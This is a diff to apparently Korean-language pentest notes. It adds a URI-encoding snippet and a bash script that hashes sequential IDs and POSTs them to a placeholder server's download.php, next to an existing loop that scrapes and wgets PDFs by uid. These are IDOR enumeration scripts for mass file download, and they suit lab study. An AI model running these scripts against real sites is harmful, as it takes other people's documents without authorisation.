@@ -1,3 +1,7 @@
+# URI encoding
+```bash
+echo 'hi!' | jq -srR '@uri'
+```
 # XSS (Cross-Site Scripting)
 ## 기본 공격 페이로드
 
@@ -791,5 +795,14 @@ for i in {1..10}; do
         for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                 wget -q $url/$link
         done
+done
+```
+```bash
+#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
 done
 ```
